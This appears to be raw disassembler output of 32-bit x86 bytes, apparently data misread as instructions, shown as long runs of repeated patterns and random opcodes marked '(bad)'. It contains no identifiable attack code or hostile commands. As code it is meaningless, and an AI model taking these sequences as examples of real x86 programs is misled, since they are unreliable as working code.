  44286c:	jne    0x442870
  44286e:	out    0x3,eax
  442870:	jne    0x442874
  442872:	out    0x3,eax
  442874:	jne    0x442878
  442876:	out    0x3,eax
  442878:	jne    0x44287c
  44287a:	out    0x3,eax
  44287c:	jne    0x442880
  44287e:	out    0x3,eax
  442880:	jne    0x442884
  442882:	out    0x3,eax
  442884:	jne    0x442888
  442886:	out    0x3,eax
  442888:	jne    0x44288c
  44288a:	out    0x3,eax
  44288c:	jne    0x442890
  44288e:	out    0x3,eax
  442890:	jne    0x442894
  442892:	out    0x3,eax
  442894:	jne    0x442898
  442896:	out    0x3,eax
  442898:	jne    0x44289c
  44289a:	out    0x3,eax
  44289c:	jne    0x4428a0
  44289e:	out    0x3,eax
  4428a0:	jne    0x4428a4
  4428a2:	out    0x3,eax
  4428a4:	jne    0x4428a8
  4428a6:	out    0x3,eax
  4428a8:	jne    0x4428ac
  4428aa:	out    0x3,eax
  4428ac:	jne    0x4428b0
  4428ae:	out    0x3,eax
  4428b0:	jne    0x4428b4
  4428b2:	add    cl,ch
  4428b4:	jbe    0x4428b8
  4428b6:	add    cl,ch
  4428b8:	jbe    0x4428bc
  4428ba:	add    cl,ch
  4428bc:	jbe    0x4428c0
  4428be:	add    cl,ch
  4428c0:	jbe    0x4428c4
  4428c2:	add    cl,ch
  4428c4:	add    BYTE PTR [eax],al
  4428c6:	add    BYTE PTR [eax],al
  4428c8:	add    BYTE PTR [esi+0x2],dh
  4428cb:	add    cl,ch
  4428cd:	jbe    0x4428d1
  4428cf:	add    cl,ch
  4428d1:	jbe    0x4428d5
  4428d3:	add    cl,ch
  4428d5:	jbe    0x4428d9
  4428d7:	add    cl,ch
  4428d9:	jbe    0x4428dd
  4428db:	add    cl,ch
  4428dd:	jbe    0x4428e1
  4428df:	add    cl,ch
  4428e1:	jbe    0x4428e5
  4428e3:	add    cl,ch
  4428e5:	jbe    0x4428e9
  4428e7:	add    cl,ch
  4428e9:	jbe    0x4428ed
  4428eb:	add    cl,ch
  4428ed:	jbe    0x4428f1
  4428ef:	add    cl,ch
  4428f1:	jbe    0x4428f5
  4428f3:	add    cl,ch
  4428f5:	jbe    0x4428f9
  4428f7:	add    cl,ch
  4428f9:	jbe    0x4428fd
  4428fb:	add    cl,ch
  4428fd:	jbe    0x442901
  4428ff:	add    cl,ch
  442901:	jbe    0x442905
  442903:	add    cl,ch
  442905:	jbe    0x442909
  442907:	add    cl,ch
  442909:	jbe    0x44290d
  44290b:	add    cl,ch
  44290d:	jbe    0x442911
  44290f:	add    cl,ch
  442911:	jbe    0x442915
  442913:	add    cl,ch
  442915:	jbe    0x442919
  442917:	add    cl,ch
  442919:	jbe    0x44291d
  44291b:	add    cl,ch
  44291d:	jbe    0x442921
  44291f:	add    cl,ch
  442921:	jbe    0x442925
  442923:	add    cl,ch
  442925:	jbe    0x442929
  442927:	add    cl,ch
  442929:	jbe    0x44292d
  44292b:	add    cl,ch
  44292d:	add    BYTE PTR [eax],al
  44292f:	add    BYTE PTR [eax],al
  442931:	add    BYTE PTR [esi+0x2],dh
  442934:	add    BYTE PTR [eax],al
  442936:	sbb    al,0x3
  442938:	add    BYTE PTR [eax],al
  44293a:	sbb    al,0x3
  44293c:	add    BYTE PTR [eax],al
  44293e:	or     al,0x3
  442940:	add    BYTE PTR [eax],al
  442942:	or     al,0x3
  442944:	add    BYTE PTR [eax],al
  442946:	fadd   QWORD PTR [edx]
  442948:	add    BYTE PTR [eax],al
  44294a:	fadd   QWORD PTR [edx]
  44294c:	add    BYTE PTR [eax],al
  44294e:	int3   
  44294f:	add    al,BYTE PTR [eax]
  442951:	add    ah,cl
  442953:	add    al,BYTE PTR [eax]
  442955:	add    ah,bl
  442957:	add    al,BYTE PTR [eax]
  442959:	add    ah,bl
  44295b:	add    al,BYTE PTR [eax]
  44295d:	add    ah,cl
  44295f:	add    al,BYTE PTR [eax]
  442961:	add    ah,cl
  442963:	add    al,BYTE PTR [eax]
  442965:	add    BYTE PTR [edx+eax*1+0x29c0000],bl
  44296c:	add    BYTE PTR [eax],al
  44296e:	mov    WORD PTR [edx],es
  442970:	add    BYTE PTR [eax],al
  442972:	mov    WORD PTR [edx],es
  442974:	add    BYTE PTR [eax],al
  442976:	pushf  
  442977:	add    al,BYTE PTR [eax]
  442979:	add    BYTE PTR [edx+eax*1+0x28c0000],bl
  442980:	add    BYTE PTR [eax],al
  442982:	mov    WORD PTR [edx],es
  442984:	add    BYTE PTR [eax],al
  442986:	pop    esp
  442987:	add    al,BYTE PTR [eax]
  442989:	add    BYTE PTR [edx+eax*1+0x0],bl
  44298d:	add    BYTE PTR [edx+eax*1+0x0],cl
  442991:	add    BYTE PTR [edx+eax*1+0x0],cl
  442995:	add    BYTE PTR [eax],al
  442997:	add    BYTE PTR [eax],al
  442999:	add    BYTE PTR [eax],al
  44299b:	pop    esp
  44299c:	add    al,BYTE PTR [eax]
  44299e:	add    BYTE PTR [edx+eax*1+0x0],bl
  4429a2:	add    BYTE PTR [edx+eax*1+0x0],cl
  4429a6:	add    BYTE PTR [edx+eax*1+0x0],cl
  4429aa:	add    BYTE PTR [edx+eax*1],bl
  4429ad:	add    BYTE PTR [eax],al
  4429af:	sbb    al,0x2
  4429b1:	add    BYTE PTR [eax],al
  4429b3:	jne    0x4429d0
  4429b5:	cld    
  4429b6:	push   DWORD PTR [ebp+0x1b]
  4429b9:	cld    
  4429ba:	push   DWORD PTR [ebp+0x1b]
  4429bd:	cld    
  4429be:	push   DWORD PTR [ebp+0x1b]
  4429c1:	cld    
  4429c2:	push   DWORD PTR [ebp+0x1b]
  4429c5:	cld    
  4429c6:	push   DWORD PTR [ebp+0x1b]
  4429c9:	cld    
  4429ca:	push   DWORD PTR [ebp+0x1b]
  4429cd:	cld    
  4429ce:	push   DWORD PTR [ebp+0x1b]
  4429d1:	cld    
  4429d2:	push   DWORD PTR [ebp+0x1b]
  4429d5:	cld    
  4429d6:	push   DWORD PTR [ebp+0x1b]
  4429d9:	cld    
  4429da:	push   DWORD PTR [ebp+0x1b]
  4429dd:	cld    
  4429de:	push   DWORD PTR [ebp+0x1b]
  4429e1:	cld    
  4429e2:	push   DWORD PTR [ebp+0x1b]
  4429e5:	cld    
  4429e6:	push   DWORD PTR [ebp+0x1b]
  4429e9:	cld    
  4429ea:	push   DWORD PTR [ebp+0x1b]
  4429ed:	cld    
  4429ee:	push   DWORD PTR [ebp+0x1b]
  4429f1:	cld    
  4429f2:	push   DWORD PTR [ebp+0x1b]
  4429f5:	cld    
  4429f6:	push   DWORD PTR [ebp+0x1b]
  4429f9:	cld    
  4429fa:	push   DWORD PTR [ebp+0x1b]
  4429fd:	cld    
  4429fe:	inc    DWORD PTR [eax]
  442a00:	add    BYTE PTR [eax],al
  442a02:	add    BYTE PTR [eax],al
  442a04:	jne    0x442a21
  442a06:	cld    
  442a07:	push   DWORD PTR [ebp+0x1b]
  442a0a:	cld    
  442a0b:	push   DWORD PTR [ebp+0x1b]
  442a0e:	cld    
  442a0f:	push   DWORD PTR [ebp+0x1b]
  442a12:	cld    
  442a13:	push   DWORD PTR [ebp+0x1b]
  442a16:	cld    
  442a17:	push   DWORD PTR [ebp+0x1b]
  442a1a:	cld    
  442a1b:	push   DWORD PTR [ebp+0x1b]
  442a1e:	cld    
  442a1f:	push   DWORD PTR [ebp+0x1b]
  442a22:	cld    
  442a23:	push   DWORD PTR [ebp+0x1b]
  442a26:	cld    
  442a27:	push   DWORD PTR [ebp+0x1b]
  442a2a:	cld    
  442a2b:	push   DWORD PTR [ebp+0x1b]
  442a2e:	cld    
  442a2f:	push   DWORD PTR [ebp+0x2]
  442a32:	out    0x3,eax
  442a34:	jne    0x442a38
  442a36:	out    0x3,eax
  442a38:	jne    0x442a3c
  442a3a:	out    0x3,eax
  442a3c:	jne    0x442a40
  442a3e:	out    0x3,eax
  442a40:	jne    0x442a44
  442a42:	out    0x3,eax
  442a44:	jne    0x442a48
  442a46:	out    0x3,eax
  442a48:	jne    0x442a4c
  442a4a:	out    0x3,eax
  442a4c:	jne    0x442a50
  442a4e:	out    0x3,eax
  442a50:	jne    0x442a54
  442a52:	out    0x3,eax
  442a54:	jne    0x442a58
  442a56:	out    0x3,eax
  442a58:	jne    0x442a5c
  442a5a:	out    0x3,eax
  442a5c:	jne    0x442a60
  442a5e:	out    0x3,eax
  442a60:	jne    0x442a64
  442a62:	out    0x3,eax
  442a64:	jne    0x442a68
  442a66:	out    0x3,eax
  442a68:	add    BYTE PTR [eax],al
  442a6a:	add    BYTE PTR [eax],al
  442a6c:	add    BYTE PTR [ebp+0x2],dh
  442a6f:	out    0x3,eax
  442a71:	jne    0x442a75
  442a73:	out    0x3,eax
  442a75:	jne    0x442a79
  442a77:	out    0x3,eax
  442a79:	jne    0x442a7d
  442a7b:	out    0x3,eax
  442a7d:	jne    0x442a81
  442a7f:	out    0x3,eax
  442a81:	jne    0x442a85
  442a83:	out    0x3,eax
  442a85:	jne    0x442a89
  442a87:	out    0x3,eax
  442a89:	jne    0x442a8d
  442a8b:	out    0x3,eax
  442a8d:	jne    0x442a91
  442a8f:	out    0x3,eax
  442a91:	jne    0x442a95
  442a93:	out    0x3,eax
  442a95:	jne    0x442a99
  442a97:	out    0x3,eax
  442a99:	jne    0x442a9d
  442a9b:	out    0x3,eax
  442a9d:	jne    0x442aa1
  442a9f:	out    0x3,eax
  442aa1:	jne    0x442aa5
  442aa3:	out    0x3,eax
  442aa5:	jne    0x442aa9
  442aa7:	out    0x3,eax
  442aa9:	jne    0x442aad
  442aab:	out    0x3,eax
  442aad:	jne    0x442ab1
  442aaf:	add    cl,ch
  442ab1:	jbe    0x442ab5
  442ab3:	add    cl,ch
  442ab5:	jbe    0x442ab9
  442ab7:	add    cl,ch
  442ab9:	jbe    0x442abd
  442abb:	add    cl,ch
  442abd:	jbe    0x442ac1
  442abf:	add    cl,ch
  442ac1:	jbe    0x442ac5
  442ac3:	add    cl,ch
  442ac5:	jbe    0x442ac9
  442ac7:	add    cl,ch
  442ac9:	jbe    0x442acd
  442acb:	add    cl,ch
  442acd:	jbe    0x442ad1
  442acf:	add    cl,ch
  442ad1:	add    BYTE PTR [eax],al
  442ad3:	add    BYTE PTR [eax],al
  442ad5:	add    BYTE PTR [esi+0x2],dh
  442ad8:	add    cl,ch
  442ada:	jbe    0x442ade
  442adc:	add    cl,ch
  442ade:	jbe    0x442ae2
  442ae0:	add    cl,ch
  442ae2:	jbe    0x442ae6
  442ae4:	add    cl,ch
  442ae6:	jbe    0x442aea
  442ae8:	add    cl,ch
  442aea:	jbe    0x442aee
  442aec:	add    cl,ch
  442aee:	jbe    0x442af2
  442af0:	add    cl,ch
  442af2:	jbe    0x442af6
  442af4:	add    cl,ch
  442af6:	jbe    0x442afa
  442af8:	add    cl,ch
  442afa:	jbe    0x442afe
  442afc:	add    cl,ch
  442afe:	jbe    0x442b02
  442b00:	add    cl,ch
  442b02:	jbe    0x442b06
  442b04:	add    cl,ch
  442b06:	jbe    0x442b0a
  442b08:	add    cl,ch
  442b0a:	jbe    0x442b0e
  442b0c:	add    cl,ch
  442b0e:	jbe    0x442b12
  442b10:	add    cl,ch
  442b12:	jbe    0x442b16
  442b14:	add    cl,ch
  442b16:	jbe    0x442b1a
  442b18:	add    cl,ch
  442b1a:	jbe    0x442b1e
  442b1c:	add    cl,ch
  442b1e:	jbe    0x442b22
  442b20:	add    cl,ch
  442b22:	jbe    0x442b26
  442b24:	add    cl,ch
  442b26:	jbe    0x442b2a
  442b28:	add    cl,ch
  442b2a:	jbe    0x442b2e
  442b2c:	add    BYTE PTR [eax],al
  442b2e:	pop    esp
  442b2f:	(bad)  
  442b30:	(bad)  
  442b31:	dec    DWORD PTR [edi+edi*8-0x1]
  442b35:	dec    DWORD PTR [edi+edi*8-0x1]
  442b39:	inc    DWORD PTR [eax]
  442b3b:	add    BYTE PTR [eax],al
  442b3d:	add    BYTE PTR [eax],al
  442b3f:	sbb    al,0xff
  442b41:	(bad)  
  442b42:	call   FWORD PTR [edi+edi*8]
  442b45:	(bad)  
  442b46:	dec    DWORD PTR [edi+edi*8]
  442b49:	(bad)  
  442b4a:	dec    DWORD PTR [edi+edi*8]
  442b4d:	(bad)  
  442b4e:	call   FWORD PTR [edi+edi*8]
  442b51:	(bad)  
  442b52:	call   FWORD PTR [edi+edi*8]
  442b55:	(bad)  
  442b56:	dec    DWORD PTR [edi+edi*8]
  442b59:	(bad)  
  442b5a:	dec    DWORD PTR [edi+edi*8]
  442b5d:	(bad)  
  442b5e:	(bad)  
  442b5f:	fdiv   st(6),st
  442b61:	(bad)  
  442b62:	(bad)  
  442b63:	fdiv   st(6),st
  442b65:	(bad)  
  442b66:	dec    esp
  442b68:	(bad)  
  442b69:	(bad)  
  442b6a:	dec    esp
  442b6c:	(bad)  
  442b6d:	(bad)  
  442b6e:	(bad)  
  442b6f:	fdiv   st(6),st
  442b71:	(bad)  
  442b72:	(bad)  
  442b73:	fdiv   st(6),st
  442b75:	(bad)  
  442b76:	dec    esp
  442b78:	(bad)  
  442b79:	(bad)  
  442b7a:	dec    esp
  442b7c:	(bad)  
  442b7d:	(bad)  
  442b7e:	call   FWORD PTR [esi+edi*8-0x1630001]
  442b85:	(bad)  
  442b86:	dec    DWORD PTR [esi+edi*8-0x1730001]
  442b8d:	(bad)  
  442b8e:	call   FWORD PTR [esi+edi*8-0x1630001]
  442b95:	(bad)  
  442b96:	dec    DWORD PTR [esi+edi*8-0x1730001]
  442b9d:	(bad)  
  442b9e:	call   FWORD PTR [esi+eax*1+0x0]
  442ba2:	add    BYTE PTR [eax],al
  442ba4:	add    BYTE PTR [eax],al
  442ba6:	add    BYTE PTR [eax],al
  442ba8:	pop    esp
  442ba9:	push   es
  442baa:	add    BYTE PTR [eax],al
  442bac:	dec    esp
  442bad:	push   es
  442bae:	add    BYTE PTR [eax],al
  442bb0:	jne    0x442bcd
  442bb2:	cld    
  442bb3:	push   DWORD PTR [ebp+0x1b]
  442bb6:	cld    
  442bb7:	push   DWORD PTR [ebp+0x1b]
  442bba:	cld    
  442bbb:	push   DWORD PTR [ebp+0x1b]
  442bbe:	cld    
  442bbf:	push   DWORD PTR [ebp+0x1b]
  442bc2:	cld    
  442bc3:	push   DWORD PTR [ebp+0x1b]
  442bc6:	cld    
  442bc7:	push   DWORD PTR [ebp+0x1b]
  442bca:	cld    
  442bcb:	push   DWORD PTR [ebp+0x1b]
  442bce:	cld    
  442bcf:	push   DWORD PTR [ebp-0x49]
  442bd2:	popf   
  442bd3:	lods   al,BYTE PTR ds:[esi]
  442bd4:	mov    esp,0x87890cf6
  442bd9:	xchg   DWORD PTR [esi-0x7e],esi
  442bdc:	fisttp QWORD PTR [eax+0x754a643c]
  442be2:	inc    edx
  442be3:	push   eax
  442be4:	test   DWORD PTR [eax+0x7a225034],0x61fb646f
  442bee:	sbb    al,BYTE PTR [eax-0x5761681a]
  442bf4:	cli    
  442bf5:	lods   eax,DWORD PTR ds:[esi]
  442bf6:	pop    esp
  442bf7:	js     0x442c05
  442bf9:	mov    ah,0xa5
  442bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442bfc:	mov    bl,0x39
  442bfe:	mov    ebx,0x1d01a95b
  442c03:	loopne 0x442b97
  442c05:	fsubr  QWORD PTR [edi+ebx*1]
  442c08:	hlt    
  442c09:	shr    DWORD PTR [ebx+0x52],cl
  442c0f:	add    BYTE PTR [eax],al
  442c11:	jae    0x442c70
  442c13:	fsubr  QWORD PTR ds:0x7118269a
  442c19:	shl    cl,0x60
  442c1c:	pushf  
  442c1d:	loope  0x442bd7
  442c1f:	jo     0x442bcc
  442c21:	push   ecx
  442c22:	daa    
  442c23:	push   es
  442c24:	jo     0x442bff
  442c26:	mov    esi,0xecd215f7
  442c2b:	call   0x5c4c:0x7b02c514
  442c32:	(bad)  
  442c33:	ins    BYTE PTR es:[edi],dx
  442c34:	cdq    
  442c35:	cmc    
  442c36:	mov    ecx,0x768b4117
  442c3b:	adc    eax,0x83871a9a
  442c40:	sar    BYTE PTR [ecx+0x3f23830f],cl
  442c46:	jmp    0x442bd7
  442c48:	test   edx,0x921245b1
  442c4e:	lea    edi,[edx+0x7]
  442c51:	xchg   ebx,eax
  442c52:	sbb    dl,cl
  442c54:	mov    DWORD PTR ds:[ebx+edx*8-0x60],ecx
  442c59:	jl     0x442c55
  442c5b:	into   
  442c5c:	mov    esi,0x728c220
  442c61:	aas    
  442c62:	jne    0x442ce2
  442c64:	nop
  442c65:	lea    esp,[edx*8+0x4314cbd1]
  442c6c:	jbe    0x442bf7
  442c6e:	sub    bh,BYTE PTR [ebx+0x47]
  442c71:	lods   al,BYTE PTR ds:[esi]
  442c72:	jmp    0x0:0x6cd
  442c79:	add    bl,cl
  442c7b:	xor    al,0x6
  442c7d:	arpl   bx,ax
  442c7f:	mul    BYTE PTR [ecx]
  442c81:	(bad)  
  442c82:	xor    BYTE PTR [esi],bh
  442c84:	test   eax,0xca8b8cec
  442c89:	sub    BYTE PTR [eax+edi*8-0x5faadc29],0xd8
  442c91:	gs and eax,0x96d84ed
  442c97:	loopne 0x442cdc
  442c99:	mov    ebp,0xa334313f
  442c9e:	scas   eax,DWORD PTR es:[edi]
  442c9f:	stos   DWORD PTR es:[edi],eax
  442ca0:	pop    eax
  442ca1:	call   0xa87:0x29762dd9
  442ca8:	lods   eax,DWORD PTR ds:[esi]
  442ca9:	dec    esi
  442caa:	xor    edi,DWORD PTR [eax]
  442cac:	inc    DWORD PTR [esi]
  442cae:	xlat   BYTE PTR ds:[ebx]
  442caf:	in     eax,0x9c
  442cb1:	out    0x6e,eax
  442cb3:	mov    BYTE PTR ds:0xf2bed655,bl
  442cb9:	sbb    ebx,DWORD PTR [ebp-0x2b25e063]
  442cbf:	stos   DWORD PTR es:[edi],eax
  442cc0:	iret   
  442cc1:	sub    ebp,DWORD PTR [edi+eiz*8]
  442cc4:	je     0x442c53
  442cc6:	jecxz  0x442c59
  442cc8:	jg     0x442d32
  442cca:	push   esi
  442ccb:	jb     0x442cce
  442ccd:	xchg   ebp,eax
  442cce:	mov    dh,0x9b
  442cd0:	cs cmp cl,dh
  442cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442cd4:	(bad)  
  442cd5:	das    
  442cd6:	out    dx,eax
  442cd7:	adc    BYTE PTR [edx+eiz*4-0x5e8a7a6b],dl
  442cde:	add    BYTE PTR [eax],al
  442ce0:	add    BYTE PTR [eax],al
  442ce2:	add    BYTE PTR [ebp-0x56567fe0],dh
  442ce8:	mov    dl,0x2
  442cea:	shl    ah,cl
  442cec:	out    0x34,eax
  442cee:	push   esi
  442cef:	xor    cl,BYTE PTR ds:0xeadc6013
  442cf5:	scas   al,BYTE PTR es:[edi]
  442cf6:	jb     0x442d4d
  442cf8:	sahf   
  442cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442cfa:	xchg   DWORD PTR [ecx-0x27add27a],ebx
  442d00:	jne    0x442d55
  442d02:	pop    ebx
  442d03:	iret   
  442d04:	fimul  DWORD PTR [edi]
  442d06:	fisttp WORD PTR [edx-0x4aae6ca9]
  442d0c:	enter  0xc0b9,0x84
  442d10:	int    0x29
  442d12:	fbld   TBYTE PTR [ecx]
  442d14:	ret    0x924f
  442d17:	daa    
  442d18:	outs   dx,BYTE PTR ds:[esi]
  442d19:	dec    edi
  442d1a:	fwait
  442d1b:	call   0x8c65:0x5d8b3fc1
  442d22:	pop    ebp
  442d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442d24:	mov    esi,DWORD PTR [ebx-0x1acb4b5b]
  442d2a:	add    dh,dl
  442d2c:	mov    ch,0x48
  442d2e:	cdq    
  442d2f:	add    dl,BYTE PTR [ebx-0x6b]
  442d32:	add    BYTE PTR [esi],0x35
  442d35:	es xor eax,0x548f2c9d
  442d3b:	dec    esi
  442d3c:	aas    
  442d3d:	jecxz  0x442cee
  442d3f:	mov    edx,0xaa3aa26d
  442d44:	pop    es
  442d45:	push   edi
  442d46:	ret    0x0
  442d49:	add    BYTE PTR [eax],al
  442d4b:	add    BYTE PTR [ebx],bl
  442d4d:	add    al,0x19
  442d4f:	or     BYTE PTR [edi-0x35123b20],0x9e
  442d56:	outs   dx,DWORD PTR ds:[esi]
  442d57:	sub    ah,ch
  442d59:	lods   eax,DWORD PTR ds:[esi]
  442d5a:	sbb    BYTE PTR [ebx],bl
  442d5c:	mov    cl,0x66
  442d5e:	mov    ebx,0x4bd9f4ba
  442d63:	mov    cl,0x17
  442d65:	cmp    BYTE PTR [edx+0x341cb34f],0x52
  442d6c:	inc    ebx
  442d6d:	inc    eax
  442d6e:	push   ebp
  442d6f:	adc    al,0xb6
  442d71:	and    edi,DWORD PTR [esp+eax*1+0x6eb9f0c2]
  442d78:	pop    esi
  442d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442d7a:	imul   esi,ebp,0x45
  442d7d:	test   eax,0xd3924a
  442d82:	inc    edi
  442d83:	mov    edx,0xe2cccdbd
  442d88:	inc    ebx
  442d89:	jb     0x442d43
  442d8b:	mov    esi,0x5dc7d920
  442d90:	push   edi
  442d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442d92:	mov    esp,0x58518511
  442d97:	mov    ah,0x6a
  442d99:	in     al,0x9
  442d9b:	cmpps  xmm0,xmm4,0x38
  442d9f:	jle    0x442d37
  442da1:	clc    
  442da2:	ins    DWORD PTR es:[edi],dx
  442da3:	nop
  442da4:	jmp    0x76148bf3
  442da9:	cli    
  442daa:	nop
  442dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442dac:	or     edx,DWORD PTR [ebx+0xf3cc]
  442db2:	add    BYTE PTR [eax],al
  442db4:	add    BYTE PTR [eax+ebx*1-0x54],bl
  442db8:	mov    BYTE PTR [ebx],bl
  442dba:	pusha  
  442dbb:	and    dh,0x76
  442dbe:	es jnp 0x442deb
  442dc1:	xchg   edx,eax
  442dc2:	shl    BYTE PTR [edi],0xaa
  442dc5:	push   esp
  442dc6:	retf   
  442dc7:	(bad)  
  442dc8:	push   esp
  442dc9:	pop    edi
  442dca:	push   es
  442dcb:	inc    esp
  442dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442dcd:	mov    bh,0x96
  442dcf:	fcomp  DWORD PTR [ebp-0x52d55f57]
  442dd5:	mov    eax,ds:0xf23d654b
  442dda:	add    al,0x9a
  442ddc:	and    ecx,DWORD PTR [esi+0x760ca13b]
  442de2:	lfs    eax,FWORD PTR [eax+0x5135d44e]
  442de9:	loopne 0x442e3d
  442deb:	addr16 aaa 
  442ded:	xchg   BYTE PTR [esi],dh
  442def:	retf   
  442df0:	int3   
  442df1:	mov    al,ds:0xee51eb79
  442df6:	mov    edi,0x7a6d8a07
  442dfb:	dec    edx
  442dfc:	(bad)  
  442dfd:	(bad)  
  442dfe:	pop    ds
  442dff:	pop    edx
  442e00:	ret    
  442e01:	inc    eax
  442e02:	jns    0x442def
  442e04:	push   ecx
  442e05:	dec    ebx
  442e06:	int    0x2c
  442e08:	leave  
  442e09:	push   ecx
  442e0a:	jns    0x442e7a
  442e0c:	xor    dh,bh
  442e0e:	lods   al,BYTE PTR ds:[esi]
  442e0f:	or     ecx,DWORD PTR [ebx+0x46850643]
  442e15:	ins    DWORD PTR es:[edi],dx
  442e16:	jnp    0x442e5a
  442e18:	cld    
  442e19:	add    BYTE PTR [eax],al
  442e1b:	add    BYTE PTR [eax],al
  442e1d:	add    dh,ch
  442e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442e20:	pop    ds
  442e21:	mov    ebp,DWORD PTR [ebx-0x7e]
  442e24:	cmp    BYTE PTR [ebx+0x21],ch
  442e27:	std    
  442e28:	jg     0x442e69
  442e2a:	cs scas al,BYTE PTR es:[edi]
  442e2c:	std    
  442e2d:	jmp    0xc798:0x8b59c58c
  442e34:	mov    esp,0xeb7920cc
  442e39:	adc    DWORD PTR [ecx+0x6d4584de],0x7b
  442e40:	inc    edx
  442e41:	loopne 0x442e41
  442e43:	mov    dh,0xdf
  442e45:	mov    eax,eax
  442e47:	and    bh,ah
  442e49:	push   eax
  442e4a:	mov    eax,ds:0xeee4527b
  442e4f:	mov    esi,0xaabd8be3
  442e54:	cld    
  442e55:	dec    esp
  442e56:	jge    0x442ed3
  442e58:	dec    edx
  442e59:	clc    
  442e5a:	out    dx,al
  442e5b:	into   
  442e5c:	test   DWORD PTR [ebx+0x44fcdeb7],0xe8427b7d
  442e66:	(bad)  
  442e67:	mov    dh,0xf7
  442e69:	mov    eax,esp
  442e6b:	loop   0x442e69
  442e6d:	push   esp
  442e6e:	ins    DWORD PTR es:[edi],dx
  442e6f:	jnp    0x442ec3
  442e71:	lock (bad) 
  442e73:	mov    esi,0x6bd8bf7
  442e78:	std    
  442e79:	dec    esp
  442e7a:	ins    DWORD PTR es:[edi],dx
  442e7b:	jnp    0x442ec7
  442e7d:	cld    
  442e7e:	xor    bh,BYTE PTR [edi+0xf3]
  442e84:	add    BYTE PTR [eax],al
  442e86:	add    BYTE PTR [ebp+0x2],dh
  442e89:	add    bl,ch
  442e8b:	jl     0x442f06
  442e8d:	push   edx
  442e8e:	hlt    
  442e8f:	idiv   BYTE PTR [edi]
  442e91:	dec    BYTE PTR [eax+0x45842e40]
  442e97:	int    0x78
  442e99:	dec    edx
  442e9a:	hlt    
  442e9b:	mov    ?,WORD PTR [edx+0x792d7317]
  442ea1:	push   edx
  442ea2:	lock out dx,al
  442ea4:	(bad)  
  442ea5:	cld    
  442ea6:	inc    esp
  442ea7:	jge    0x442f24
  442ea9:	inc    edx
  442eaa:	fcomp  QWORD PTR [edi]
  442eac:	hlt    
  442ead:	lods   al,BYTE PTR ds:[si]
  442eaf:	jbe    0x442e73
  442eb1:	dec    DWORD PTR [edx-0x17b1b9d8]
  442eb7:	and    eax,0xf6000003
  442ebc:	cmp    eax,0xaeb5850b
  442ec1:	adc    al,0x8b
  442ec3:	and    BYTE PTR [esi],ch
  442ec5:	test   BYTE PTR [ebp+0x5d],al
  442ec8:	hlt    
  442ec9:	mov    al,0xc
  442ecb:	lds    edi,FWORD PTR [ecx+0x4a]
  442ece:	in     al,dx
  442ecf:	out    dx,al
  442ed0:	int    0xeb
  442ed2:	mov    esi,DWORD PTR [eax-0x1afb7bda]
  442ed8:	inc    DWORD PTR [edx+0x8]
  442edb:	pop    esi
  442edc:	test   BYTE PTR [ebp+ecx*2+0x4be8045],0xec
  442ee4:	mov    ch,0xef
  442ee6:	jmp    0x442ec1
  442ee8:	out    dx,eax
  442ee9:	mov    edi,0x8b
  442eee:	add    BYTE PTR [eax],al
  442ef0:	adc    dh,al
  442ef2:	mov    esp,0xcb3731cc
  442ef7:	int3   
  442ef8:	sub    DWORD PTR [edi],esi
  442efa:	retf   
  442efb:	int3   
  442efc:	inc    ecx
  442efd:	aaa    
  442efe:	retf   
  442eff:	int3   
  442f00:	mov    al,ds:0x1183eb77
  442f05:	or     ebp,eax
  442f07:	add    eax,0x89f823fa
  442f0c:	cmp    BYTE PTR [edx],bl
  442f0e:	test   BYTE PTR [ebp-0x23],al
  442f11:	shl    bh,cl
  442f13:	sub    edx,esp
  442f15:	and    edi,eax
  442f17:	xor    DWORD PTR [ecx-0x30bb6302],0xffffffbf
  442f1e:	jmp    DWORD PTR [edi+0x9]
  442f21:	add    BYTE PTR [eax+0x0],al
  442f24:	out    dx,al
  442f25:	mov    ch,0xe7
  442f27:	push   ecx
  442f28:	mov    edx,0x36fa440d
  442f2d:	add    bl,BYTE PTR [ebp-0x4050b8]
  442f33:	imul   esi,DWORD PTR [ebp-0x68],0xffa967ff
  442f3a:	aas    
  442f3b:	add    BYTE PTR [edx+0x36fa480d],dl
  442f41:	add    al,BYTE PTR [edi+0x423b8d45]
  442f47:	cld    
  442f48:	jne    0x442f4c
  442f4a:	add    BYTE PTR [eax],al
  442f4c:	pop    esi
  442f4d:	stc    
  442f4e:	test   BYTE PTR [ebp+0x69],dl
  442f51:	jg     0x442f10
  442f53:	add    DWORD PTR [eax],eax
  442f55:	add    BYTE PTR [eax],al
  442f57:	add    BYTE PTR [eax],al
  442f59:	in     al,dx
  442f5a:	int3   
  442f5b:	sti    
  442f5c:	sbb    eax,0x26
  442f5f:	pop    es
  442f60:	jae    0x442ef6
  442f62:	ja     0x442fa6
  442f64:	cld    
  442f65:	(bad)  
  442f66:	cmc    
  442f67:	or     BYTE PTR [esi+esi*2-0x11af003e],0xcc
  442f6f:	out    0x52,eax
  442f71:	xor    cl,BYTE PTR ds:0x2b6fa44
  442f77:	test   DWORD PTR [ebp+0x21],ecx
  442f7a:	jns    0x442f7f
  442f7c:	lea    esi,[ecx+0x1e003c28]
  442f82:	push   edx
  442f83:	test   ch,ah
  442f85:	test   al,0x3f
  442f87:	retf   
  442f88:	int3   
  442f89:	xor    DWORD PTR [esi],esi
  442f8b:	retf   
  442f8c:	int3   
  442f8d:	sub    DWORD PTR [esi],esi
  442f8f:	retf   
  442f90:	int3   
  442f91:	shl    DWORD PTR ds:0x7740cccb,0xeb
  442f98:	mov    eax,ds:0x3c2815
  442f9d:	fwait
  442f9e:	ja     0x442fdf
  442fa0:	xor    dh,bh
  442fa2:	mov    ah,0x7
  442fa4:	ds cld 
  442fa6:	mov    ecx,0x35b65d07
  442fab:	retf   
  442fac:	int3   
  442fad:	test   eax,0xc1cccb35
  442fb2:	xor    eax,0x7740cccb
  442fb7:	jmp    0x442f44
  442fb9:	cmp    dh,dh
  442fbb:	dec    edi
  442fbc:	mov    eax,DWORD PTR [eax]
  442fbe:	add    BYTE PTR [eax],al
  442fc0:	add    BYTE PTR [eax],al
